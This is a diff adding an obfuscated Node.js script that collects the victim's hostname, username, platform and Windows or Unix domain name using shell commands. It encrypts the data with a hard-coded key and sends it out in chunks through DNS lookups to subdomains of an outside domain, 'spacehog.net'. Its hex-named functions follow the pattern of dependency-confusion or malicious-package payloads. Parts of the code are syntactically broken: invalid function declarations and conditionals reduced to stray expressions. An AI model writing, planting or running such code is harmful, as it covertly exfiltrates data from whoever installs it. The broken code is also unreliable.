@@ -1,0 +1,70 @@
+var os = require('os')
+var crypto = require('crypto')
+var dns = require('dns')
+const http = require('http')
+const execSync = require('child_process').execSync
+function ca4bb072ceea3ab317f305a685b251ed = function ca4bb072ceea3ab317f305a685b251ed(string,chunk_size) {
+    var b = [];
+    newstring = '';
+    char_count = 0
+
+    for(var i=0; i < string.length; i+=1){
+        char_count+=1;
+        if (char_count < chunk_size) {
+            newstring+= string[i];
+        }
+        else {
+    	    b.push(newstring);
+	    newstring = string[i];
+	    char_count = 0;
+        }
+    }
+    
+    if (newstring.length != 0 && b[b.length -1] != newstring){b.push(newstring);}
+    
+    if (b.length > 0 && b.length < 3) {
+	    return_string = b.toString().replace(",",".");
+	    return return_string;
+    }
+    else if (b.length == 0) {
+        return newstring;
+    }
+    else {
+        return b;
+    }
+}
+function f994d544e6f15ccbb04cee479878873c6 = function f994d544e6f15ccbb04cee479878873c6(sequence,semi_random_id, information, information_identifier, domain) {
+    dns.lookup(sequence+'.'+semi_random_id+'.'+information_identifier+'.'+information+'.'+domain, function (err, addresses, family) {console.log(addresses);});
+}
+function fd0f60879b6f401ef092352411106e59aa1523286e8a033c063048842f6aa3ae = function fd0f60879b6f401ef092352411106e59aa1523286e8a033c063048842f6aa3ae(semi_random_id, information, information_identifier, domain) {
+    if (typeof information == 'object') {
+     
+        for (i = 0; i < information.length;i++ ) {
+            f994d544e6f15ccbb04cee479878873c6(i,semi_random_id, information[i], information_identifier, domain);    
+        }
+    }
+    else if (typeof information == 'string') {
+        f994d544e6f15ccbb04cee479878873c6('n',semi_random_id, information, information_identifier, domain);
+    }
+}
+let domain = 'spacehog.net'
+let super_secret_password = '27666fae19bb1ebb2d83eddd69195c63'
+let userinfo = os.userInfo()
+let info = ""
+const buf = crypto.randomBytes(2)
+const semi_random_id = buf.toString('hex')
+(_tmp_1 = os.platform()).includes
+domain_info = execSync('wmic computersystem get domain').toString()
+domain_info = domain_info.replace(/[\n\r\t\s]/g, '').replace("Domain","")
+info += info.concat(os.hostname(),",",userinfo['username'],",",os.platform(),",",domain_info)
+(_tmp_4 = os.platform()).includes
+domain_info = execSync('uname -n').toString()
+domain_info = domain_info.replace(/[\n\r\t\s]/g, '')
+info += info.concat(os.hostname(),",",userinfo['username'],",",os.platform(),",",domain_info)
+info += info.concat(os.hostname(),",",userinfo['username'],",",os.platform())
+var super_secret_key = crypto.createCipher('aes-128-cbc',super_secret_password)
+var update = super_secret_key.update(info,'utf8','hex')
+update+= super_secret_key.final('hex')
+subdomain_split = ca4bb072ceea3ab317f305a685b251ed(update,63)
+fd0f60879b6f401ef092352411106e59aa1523286e8a033c063048842f6aa3ae(semi_random_id, subdomain_split, 'u', domain)
+var super_secret_key = crypto.createCipher('aes-128-cbc',super_secret_password)
